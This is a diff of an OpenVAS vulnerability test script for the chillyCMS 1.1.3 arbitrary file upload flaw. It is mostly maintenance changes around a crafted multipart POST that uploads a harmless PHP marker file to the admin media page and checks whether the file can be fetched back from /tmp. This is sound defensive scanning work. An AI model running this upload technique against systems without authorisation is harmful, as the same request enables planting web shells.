@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_chillyCMS_43263.nasl 5263 2017-02-10 13:45:51Z teissa $
+# $Id: gb_chillyCMS_43263.nasl 5838 2017-04-03 10:26:36Z cfi $
 #
 # chillyCMS Arbitrary File Upload Vulnerability
 #
@@ -36,13 +36,13 @@ are also possible.
 chillyCMS version 1.1.3 is vulnerable; other versions may also
 be affected.";
 
-if (description)
+if(description)
 {
- script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43263");
+ script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/43263");
  script_xref(name : "URL" , value : "http://www.chillycms.bplaced.net/chillyCMS/");
  script_id(100809);
- script_version("$Revision: 5263 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-10 14:45:51 +0100 (Fri, 10 Feb 2017) $");
+ script_version("$Revision: 5838 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-04-03 12:26:36 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)");
  script_bugtraq_id(43263);
  script_tag(name:"cvss_base", value:"4.6");
@@ -62,26 +62,24 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-   
+
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/chillyCMS","/cms",cgi_dirs());
 rand = rand();
 file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");
 len  = 713 + strlen(file);
-host = get_host_name();
+host = http_host_name( port:port );
 
-foreach dir (dirs) {
-   
+foreach dir( make_list_unique( "/chillyCMS", "/cms", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
   url = string(dir, "/admin/media.site.php"); 
-
 
   req =  string('POST ',url,' HTTP/1.1',"\r\n",
            "Host: ",host,"\r\n",
            "Proxy-Connection: keep-alive\r\n",
-           "User-Agent: x\r\n",
+           "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
            "Content-Length: ",len,"\r\n",
            "Cache-Control: max-age=0\r\n",
            "Origin: null\r\n",
@@ -134,7 +132,6 @@ foreach dir (dirs) {
            "<?php echo '<pre>openvas-upload-test</pre>'; ?>\r\n",
            "------x--\r\n",
            "\r\n"); 
-
   recv = http_keepalive_send_recv(data:req, port:port, bodyonly:FALSE);
   
   if(recv) {
@@ -142,7 +139,7 @@ foreach dir (dirs) {
     req2 = http_get(item:string(dir, "/tmp/", file), port:port);
     recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);
 
-    if (recv2 == NULL) exit(0);
+    if (recv2 == NULL) continue;
     if("openvas-upload-test" >< recv2) {
  
       report = string( 
@@ -151,13 +148,10 @@ foreach dir (dirs) {
         "## The file is placed in directory: ", '"', dir, '/tmp/"', "\n",
         "## and is named: ", '"', file, '"', "\n\n",
         "## You should delete this file as soon as possible!\n");
-
       security_message(port:port, data:report);
       exit(0);
-
     }  
-
   }  
-
 }
+
 exit(0);
